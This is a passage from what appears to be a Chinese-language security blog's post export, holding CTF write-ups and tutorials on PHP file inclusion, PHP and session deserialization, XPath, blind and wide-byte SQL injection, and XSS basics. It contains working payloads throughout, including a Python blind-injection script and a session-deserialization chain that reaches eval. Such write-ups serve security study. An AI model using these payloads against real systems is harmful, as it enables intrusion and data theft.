empty($_REQUEST[&apos;file&apos;]) &amp;&amp; is_string($_REQUEST[&apos;file&apos;]) &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]) ) { include $_REQUEST[&apos;file&apos;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt;首先看主代码， if (! empty($_REQUEST[&apos;file&apos;])&amp;&amp; is_string($_REQUEST[&apos;file&apos;])&amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]))传入一个变量file，file是一个字符串且函数emmm::checkfile返回真，即可进行文件包含。接着进入emmm类里的checkFile函数， 首先传一个参数，file=hint.php，得到提示：flag not here, and flag in ffffllllaaaagggg确定了目标，需包含ffffllllaaaagggg这个文件 一共有四个判断语句：第一个，传入的参数必须是字符串，否则返回false第二个，如果传入参数在whitelist数组里，则返回true第三个，判断截取后的$page是否存在于whitelist数组里，存在则返回true第四个，先对$page进行url解码，然后判断进行截取，判断截取后的$page是否存在于whitelist数组里，存在则返回true 突破点在第四个if语句中，会进行两次url解码，php中的$_GET、$_POST、$_REQUEST这类函数在提取参数值时会进行一次url解码其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true所以可以构造Payload: /index.php?file=source.php%253F/../../../../ffffllllaaaagggg原理是source.php?/被当作目录，之后上跳目录就好了（这个只适用于linux），我们不知道文件在哪，只能一级一级的试 [ZJCTF 2019]NiZhuanSiWei知识点1.data://伪协议 data协议可以使你输入得字符串作为数据流 2.反序列化 解题打开题目，显示源码： 12345678910111213141516171819 &lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123; echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"Not now!\"; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 需要通过两个if判断； 第一个： 1if(isset($text)&amp;&amp;(file_get_contents($text,&apos;r&apos;)===&quot;welcome to the zjctf&quot;)) 需要我们传入一个文件且其内容为welcome to the zjctf，可以使用data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下： 1text=data://text/plain,welcome to the zjctf 第二个： 1if(preg_match(&quot;/flag/&quot;,$file)) file中不能含有flag。根据提示，包含useless.php；并且读取出来； 1file=php://filter/read=convert.base64-encode/resource=useless.php 读到的useless.php： 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); &#125; &#125; &#125; ?&gt; 如果触发__tostring()函数，令$file=flag.php,就可以读取flag.php中的内容，刚好有一个 echo $password;令$password为一个Flag对象，可以触发Flag类的__tostring方法； 直接反序列化： 123456789&lt;?php class Flag&#123; public $file=&apos;flag.php&apos;; &#125;$a=new Flag();echo serialize($a);?&gt; 得到：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} 最终获取flag的payload 1?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;","categories":[],"tags":[]},{"title":"极客大挑战（hardsql&finalsql）","slug":"极客大挑战（hardsql-finalsql）","date":"2020-10-15T00:55:28.000Z","updated":"2020-10-15T01:47:28.626Z","comments":true,"path":"2020/10/15/极客大挑战（hardsql-finalsql）/","link":"","permalink":"http://yoursite.com/2020/10/15/极客大挑战（hardsql-finalsql）/","excerpt":"","text":"知识点有关sql报错注入：extractvalue()、updatexml() extractvalue():对xml文档进行查询的函数语法：extractvalue(目标文档，xml路径)第二个参数，xml中的位置是可操作的地方，xml文档中查找字符串位置是用/xxx/xxx/xxx…这种格式，如果我们写入其他格式，就会报错，并且返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错updatexml():对xml进行更新的函数。语法：updatexml(目标xml文档，xml路径，更新的内容)可用的地方和extractvalue()函数一致 right、left函数从字符串左边、右边取指定个字符，right(string,n) [极客大挑战]Hardsql经测试过滤了and、= 空格 union等多个sql关键字常规sql注入被检测到。然后发现order by 和 union 都不行XPATH报错注入就可以用了可以使用extractvalue和updatexml进行报错注入输入的时候发现了这题目还过滤了空格和and emmmm 用括号来代替空格就能绕过了发现还不行百度了web 的骚操作用’^’来连接函数，形成异或这边用的是extractvalue（）爆数据库名 playload:username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(database()))))%23爆表名 username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&apos;geek&apos;)))))%23查字段 username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(group_concat(passwor))from(information_schema.columns)where((table_name)like(&apos;H4rDsq1&apos;)))))%23查数据 username=44&amp;password=1&apos;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(H4rDsq1))))%23[极客大挑战]finalsql根据提示，是盲注过滤的字符和上题基本一样，用脚本跑，二分法代码： import time import requests url = &quot;http://779204c6-5eca-4e96-ab0c-f225aa0ed576.node3.buuoj.cn/search.php?id=&quot; i = 0 result = &apos;&apos; while True: i=i+1 low = 32 high = 127 while low &lt; high : mid = (low + high) // 2 #payload = &apos;(ascii(substr(database(),%d,1))&gt;%d)&apos; % (i, mid) #payload = &quot;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=(database())),%d,1)) &gt;%d)&quot;%(i,mid) #payload = &quot;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=(&apos;F1naI1y&apos;)),%d,1))&gt; %d)&quot; %(i,mid) payload = &apos;(ascii(substr((select(group_concat(username))from(F1naI1y)),%d,1))&gt;%d)&apos; % (i, mid) r = requests.get(url + payload) time.sleep(0.1) if &quot;Click&quot; in r.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result)","categories":[],"tags":[]},{"title":"极客大挑战","slug":"极客大挑战","date":"2020-04-19T09:26:07.000Z","updated":"2020-04-19T10:25:07.525Z","comments":true,"path":"2020/04/19/极客大挑战/","link":"","permalink":"http://yoursite.com/2020/04/19/极客大挑战/","excerpt":"","text":"php先用dirsearch扫了一下目录，发现了一个www.zip，根据题目提示，很有可能是备份文件。解压后看到一个flag.php,打开里边有一个flag，提交不正确。然后观察其余的class.php和index.php，发现关键代码。index.php中： &lt;?php include &apos;class.php&apos;; $select = $_GET[&apos;select&apos;]; $res=unserialize(@$select); ?&gt;class.php中： &lt;?php include &apos;flag.php&apos;; error_reporting(0); class Name{ private $username = &apos;nonono&apos;; private $password = &apos;yesyes&apos;; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = &apos;guest&apos;; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === &apos;admin&apos;) { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;; die(); } } } ?&gt;发现这是一道和php反序列化有关的题目；审计代码，发现只要使传入的字符串反序列化后，username等于admin就可以输出flag了，但是在进行反序列化之前，会执行这个类中的__wakeup()函数，$this-&gt;username = ‘guest’;即无论你的用户名是什么，都会改为guest。先看一下几个魔法方法： __construct()：创建对象时初始化，当一个对象创建时被调用 __wakeup() 使用unserialize时触发 __sleep() 使用serialize时触发 __destruction()：结束时销毁对象，当一个对象销毁时被调用当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。在url中，用%00来代替\\0.即payload由 O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}变为 O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}http这道题主要是了解http协议，使用burpsuit抓包构造包。需要改的几个部分： referer：当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。 User-Agent 中文名为用户代理，简称 UA X-Forwarded-For： 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 IP。需要改的信息： referer： https://www.Sycsecret.com user-Agent: syclover browser X-Forwarded-For: 127.0.0.1buy flag抓包发现Cookie: user=0，把0改为1。 查看源代码，发现： &lt;!-- ~~~post money and password~~~ if (isset($_POST[&apos;password&apos;])) { $password = $_POST[&apos;password&apos;]; if (is_numeric($password)) { echo &quot;password can&apos;t be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; } }这是一个is_numeric函数的绕过，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0post传参一个password=404a,看界面提示Pay for the flag!!!hacker!!!需要再次传参一个钱的参数，试了下，post传参moner变量，发现提示数字长度过长，有科学记数法绕过最终post传参为 password=404a&amp;money=10e8得flag。","categories":[],"tags":[]},{"title":"php变量覆盖","slug":"php变量覆盖","date":"2020-03-13T04:53:11.000Z","updated":"2020-03-13T05:40:44.334Z","comments":true,"path":"2020/03/13/php变量覆盖/","link":"","permalink":"http://yoursite.com/2020/03/13/php变量覆盖/","excerpt":"前言变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。 经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等.","text":"前言变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。 经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等. $$可变变量$$表示一个可变变量获取一个普通变量的值为这个可变变量的变量名，于foreach函数结合，可产生变量覆盖漏洞。 foreach函数，遍历数组中的值 foreach($array as $key=&gt;$value){ //$array的键名赋给$key，键值赋给$value $$key=$value; //把键值赋给$$key }一个例子理解可变变量 &lt;?php $a=&apos;hello&apos;; $$a=2; print($hello); ?&gt;输出结果为2. 一道题目&lt;?php include &quot;flag.php&quot;; $_403 = &quot;AccessDenied&quot;; $_200 = &quot;Welcome Admin&quot;; if ( !isset($_POST[&quot;flag&quot;]) ) die($_403); foreach ($_GET as $key =&gt; $value) $$key = $$value; foreach ($_POST as $key =&gt; $value) $$key = $value; if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403); else { echo &quot;This is your flag : &quot;. $flag . &quot;\\n&quot;; die($_200); } ?&gt;这道题有两个foreach语句，可以进行两次变量覆盖，先看一下才能得到flag，post一个flag与代码中的flag一致就可输出flag，很明显我们无法才出flag的值，只能进行变量覆盖，把flag变量覆盖掉，但是我们还需要原来的flag值，再往下看，有一个die($_200),输出了一下_200这个变量，我们可以先把flag的值给_200，然后在覆盖掉flag的值。foreach ($_GET as $key =&gt; $value) $$key = $$value;get传参，_200=flag,这样就可以先把我们需要的flag值赋给_200foreach ($_POST as $key =&gt; $value) $$key = $value;post传参，随便赋给flag一个值，如：flag=aa这样就能获得flagget:_200=flagpost:flag=aa extract函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。语法 extract(array,extract_rules,prefix) extract_rules参数说明EXTR_OVERWRITE如果有冲突，覆盖已有的变量。 EXTR_SKIP如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。 如果没有指定 flags，则被假定为 EXTR_OVERWRITE。 一个例子&lt;?php include &quot;flag.php&quot;; $password=&apos;Hmanlou&apos;; extract($_GET); if(isset($test)) { if($password==$test){ echo &apos;flag:&apos;,$flag; } else echo &apos;error&apos;; } else echo &apos;no test&apos;;parse_str函数Parse_str()–将字符串解析成多个变量parse_str(string,array)如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。","categories":[],"tags":[]},{"title":"正则表达式笔记“ ","slug":"正则表达式笔记“","date":"2020-03-01T07:30:33.000Z","updated":"2020-03-01T11:15:54.982Z","comments":true,"path":"2020/03/01/正则表达式笔记“/","link":"","permalink":"http://yoursite.com/2020/03/01/正则表达式笔记“/","excerpt":"特殊字符 特殊字符 描述 $ 匹配输入字符串的结尾位置 () 标记一个子表达式的开始和结束位置 * 匹配前面的子表达式零次或者多次 + 匹配前面的子表达式一次或多次 . 匹配除\\n换行符之外的任何字符 [ 标记一个中括号表达式的开始 ？ 匹配前面的子表达式的零次或者一次，或指明一个非贪婪限定符 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合 { 标记限定符表达式的开始 | 指明两项之间的一个选择，即“或”","text":"特殊字符 特殊字符 描述 $ 匹配输入字符串的结尾位置 () 标记一个子表达式的开始和结束位置 * 匹配前面的子表达式零次或者多次 + 匹配前面的子表达式一次或多次 . 匹配除\\n换行符之外的任何字符 [ 标记一个中括号表达式的开始 ？ 匹配前面的子表达式的零次或者一次，或指明一个非贪婪限定符 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合 { 标记限定符表达式的开始 | 指明两项之间的一个选择，即“或” 限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。 ？ 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。","categories":[],"tags":[]},{"title":"xss入门","slug":"xss入门","date":"2020-02-27T02:21:39.000Z","updated":"2020-03-01T12:01:56.458Z","comments":true,"path":"2020/02/27/xss入门/","link":"","permalink":"http://yoursite.com/2020/02/27/xss入门/","excerpt":"xss入门什么是xss攻击xss跨站脚本攻击，是指攻击者通过巧妙的方法将一段脚本内容放入到网页，使用户加载并执行攻击者恶意制造的网页程序。","text":"xss入门什么是xss攻击xss跨站脚本攻击，是指攻击者通过巧妙的方法将一段脚本内容放入到网页，使用户加载并执行攻击者恶意制造的网页程序。 攻击的条件1.需要向web页面注入恶意代码；2.这些恶意代码能够被浏览器成功执行。 xss分类反射型 反射型跨站脚本是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。存储型 存储型跨站脚本，此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。DOM型 基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。反射型xss的数据流向是：浏览器-&gt;后端-&gt;浏览器 存储型xss的数据流向是:浏览器-&gt;后端-&gt;数据库-&gt;后端-&gt;浏览器 dom型xss的数据流向是：url-&gt;浏览器 什么是浏览器的dom文本对象模型文本对象模型（DOM）是一个能够让程序和脚本动态访问和更新文档内容，结构和样式的语言平台，提供了标准的HTML和XML对象集，并有一个标准的接口来访问操作他们。 ——摘自W3C 每个容器、独立的元素，或文本块都被看作一个节点，当一个容器包含另一个容器时，对应的节点之间有父子关系。同时该节点树遵循HTML的结构化本质，如html元素包含head，body，前者又包含title,或者包含各种块元素等。 &lt;html&gt; &lt;body&gt; &lt;p&gt; Hello World &lt;/p&gt; &lt;div&gt; &lt;img src=&quot;example.png&quot;/&gt;&lt;/div&gt;7 &lt;/body&gt; &lt;/html&gt; 常用的javascript代码 &lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; #onerror 事件会在文档或图像加载过程中发生错误时被触发 &lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;xss的危害劫持用户会话盗取cookie钓鱼欺骗强制弹出广告提升用户权限传播跨站脚本蠕虫 xss题目的常用思路1.payload外部js 2.绕过正则 3.闭合标签 4.转化编码 5.创建错误执行Js 一个xss练习网址：https://xss.haozi.me/","categories":[],"tags":[]},{"title":"sql宽字节注入学习","slug":"sql宽字节注入学习","date":"2019-11-17T02:26:36.000Z","updated":"2019-11-18T10:34:28.703Z","comments":true,"path":"2019/11/17/sql宽字节注入学习/","link":"","permalink":"http://yoursite.com/2019/11/17/sql宽字节注入学习/","excerpt":"首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入 原理： GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）","text":"首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入 原理： GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围） 先了解一下编码知识 UTF8由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF 宽字节GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。宽字节注入，主要针对GBK的使用， 注明： GBK编码，它的编码范围是0×8140~0xFEFE(不包括xx7F)，在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘\\’，而%27、%20小于ascii(128)的字符就保留了。 经常用到的url转码 空格 %20 &apos; %27 \\ %5C转义函数：addslashes -使用反斜线引用字符串 string addslashes(string $str)返回字符串，该字符串为了数据库查询语句等的需要，在某些字符前加上反斜线。这些字符是单引号(‘)、双引号(“)、反斜线()与NUL(NULL字符)。如何从addslashes函数逃逸出来？ 把\\弄没 &apos; -&gt; \\&apos; -&gt; %5C%27 %df&apos; -&gt;%df\\&apos; -&gt; %df%5C%27 一道例题南邮ctf GBK Injection题目网址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 这道题，主要是用一个ascii值大于128的字符，放在’前面，使之编码成为一个汉字，例如用%df也就是，%df’ -&gt;%df&#39; -&gt; %df%5C%27 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-2%df&apos; union select 1,database()--+ #sae-chinalover数据库名 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+ #ctf,ctf2,ctf3,ctf4,gbksqli,news表名 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-2%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() where table_name=0x63746634 --+ 读列名 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-2%df&apos; union select 1,group_concat(flag) from ctf4 --+ 读数据得flag","categories":[],"tags":[]},{"title":"PHP session反序列化","slug":"PHP-session反序列化","date":"2019-11-03T06:03:32.000Z","updated":"2019-11-04T11:05:55.436Z","comments":true,"path":"2019/11/03/PHP-session反序列化/","link":"","permalink":"http://yoursite.com/2019/11/03/PHP-session反序列化/","excerpt":"PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。","text":"PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。 PHP session的工作流程当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie），如果发现请求的Cookies、Get、Post中不存在session id，PHP 就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给客户端保存 PHP session的几个常见配置session.upload_progress.enabled启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。 session.serialize_handler定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同 session.save_pathsession文件的存储位置 session.auto_start=0表明默认不启动session session.save_handler=filessession文件的存储方式 PHP session序列化及反序列化处理器php在session存储和读取时,都会有一个序列化和反序列化的过程，序列化、反序列化中会调用对象的magic方法,比如destruct(),wakeup()等PHP 内置了多种处理器用于处理 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下： php_binary：存储格式为，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值 php：存储格式为，键名+竖线+经过serialize函数序列化处理的值 php_serialize(php&gt;5.5.4)：存储格式为，经过serialize函数序列化处理的值具体用哪个处理器，由session.serialize_handler来定义。 一道php session反序列化漏洞的题jarvis上的PHPINFO:http://web.jarvisoj.com:32784/代码： &lt;?php //A webshell is wait for you ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET[&apos;phpinfo&apos;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(&apos;index.php&apos;)); } ?&gt;看到PHP代码中的ini_set(‘session.serialize_handler‘, ‘php‘)猜到这道题目可能与PHP中的Session序列话的问题有关，看了下phpinfo(),发现 session.serialize_handler：php_serialize session.upload_progress.enabled：onphp.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。这个漏洞如果要触发，则需要在服务器中写入一个使用php_serialize序列话的值，然后访问index.php时就会被php的引擎反序列化。但是本题中没有提供写入session的方法，但是session.upload_progress.enabled这个是开着的，我们可以借此向服务器设置session，当session.upload_progress.enabled选项开启时，PHP能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;test XXE&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://127.0.0.1/b/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--不对字符编码--&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;获取项目路径：通过dirname获取文件路径设置$mdzz=‘print_r(dirname(FILE));‘序列化得到的结果是O:5:”OowoO”:1:{s:4:”mdzz”;s:27:”print_r(dirname(FILE));”;}文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(FILE));&quot;;}opt/lampp/htdocs 获取文件列表通过scandir获取文件列表设置$mdzz=‘print_r(scandir(“/opt/lampp/htdocs”));‘序列化的结果是O:5:”OowoO”:1:{s:4:”mdzz”;s:38:”print_r(scandir(“/opt/lampp/htdocs”));”;}文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:38:&quot;print_r(scandir(&quot;/opt/lampp/htdocs&quot;));&quot;;}发现存在Here_1s_7he_fl4g_buT_You_Cannot_see.php。 读取文件内容：通过file_get_contents读取文件内容设置$mdzz=print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));序列话结果O:5:”OowoO”:1:{s:4:”mdzz”;s:88:”print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));”;}文件名设置为|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;}。 最后就得到flag了。","categories":[],"tags":[]},{"title":"序列化与反序列化","slug":"序列化与反序列化","date":"2019-10-25T07:21:30.000Z","updated":"2019-10-25T07:34:08.507Z","comments":true,"path":"2019/10/25/序列化与反序列化/","link":"","permalink":"http://yoursite.com/2019/10/25/序列化与反序列化/","excerpt":"php的序列化与反序列化通俗的说，序列化就是将变量通过一系列的操作转化为字符串的过程；而反序列化就是其逆过程，将字符串还原成原来的变量；进行序列化与反序列化操作，可以轻松地存储和传输数据。","text":"php的序列化与反序列化通俗的说，序列化就是将变量通过一系列的操作转化为字符串的过程；而反序列化就是其逆过程，将字符串还原成原来的变量；进行序列化与反序列化操作，可以轻松地存储和传输数据。 序列化对于不同类型得到的字符串格式为： String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;} Object : O:strlen(object name):object name:object size:{s:strlen(propertyname):property name:property definition;} 举个例子： $arr = array(‘PHP’,’Java’,’Python’,’C’); $result = serialize($arr); echo $result; 运行结果： a:4:{i:0;s:3:”PHP”;i:1;s:4:”Java”;i:2;s:6:”Python”;i:3;s:1:”C”;}a:表示的是整体的数据类型，这里是array数组;a:4中的4:表示数组元素的个数;i:表示int,整型;0:表示数组元素的下标;s:表示string，即数组值得类型;s:3中的3:表示数组值的长度。 在序列化对象时，不会保留常量的值，对于父类中的变量，则会保留。当调用serialize()函数序列化对象时，该函数会检查类中是否存在一个魔术方法，__sleep()。如果存在，该方法会被先调用，然后才执行序列化操作。可以通过重载这个方法，从而自定义序列化行为。例如，对象中的一些私有敏感属性，我们不想将它们序列化，就可以用这样的方法。__sleep()的方法原型为：public array __sleep ( void )该方法返回一个包含对象中所有应被序列化的变量名称的数组，不能返回父类的私有成员的名字。 对于反序列化，有一个unserialize()函数，unserialize()反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。如果传递的字符串不可解序列化，则返回 FALSE,若被反序列化的变量是一个对象，在成功重新构造对象之后，该函数会检查类中是否存在一个魔术方法，wakeup()。如果存在，该方法会被先调用，然后才执行反序列化操作。在反序列化操作时，遇到对象，若在此之前并未定义该类，反序列化正常执行，反序列化得到的对象是’PHP_Incomplete_Class’预先定义了该类 class User{ const SITE = &apos;uusama&apos;; public $username; public $nickname; private $password; private $order; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 定义反序列化后调用的方法 public function __wakeup() { 